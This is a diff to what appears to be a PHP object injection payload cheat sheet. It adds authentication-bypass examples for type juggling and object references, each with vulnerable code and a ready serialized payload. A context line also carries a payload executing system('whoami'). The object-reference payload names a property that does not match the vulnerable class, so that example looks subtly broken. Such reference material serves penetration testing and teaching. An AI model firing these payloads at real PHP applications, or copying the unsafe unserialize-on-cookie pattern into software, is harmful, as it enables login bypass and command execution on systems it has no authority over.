@@ -43,6 +43,65 @@ string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
 
 ```
 
+## Authentication bypass
+
+### Type juggling
+
+Vulnerable code:
+
+```php
+<?php
+$data = unserialize($_COOKIE['auth']);
+
+if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
+    $admin = true;
+} else {
+    $admin = false;
+}
+```
+
+Payload:
+
+```
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+```
+
+Because `true == "str"` is true. Ref: [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
+
+### Object reference
+
+Vulnerable code:
+
+```php
+<?php
+class Object
+{
+  var $guess;
+  var $secretCode;
+}
+
+$obj = unserialize($_GET['input']);
+
+if($obj) {
+    $obj->secretCode = rand(500000,999999);
+    if($obj->guess === $obj->secretCode) {
+        echo "Win";
+    }
+}
+?>
+```
+
+Payload:
+
+```
+O:6:"Object":2:{s:10:"secretCode";N;s:4:"code";R:2;}
+```
+
+Ref: 
+
+- [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
+- [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/MeePwn-2017-write-ups/#tsulott-web)
+
 ## Others exploits
 
 Reverse Shell
@@ -75,3 +134,4 @@ echo urlencode(serialize(new PHPObjectInjection));
 
 * [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
 * [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
+* [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
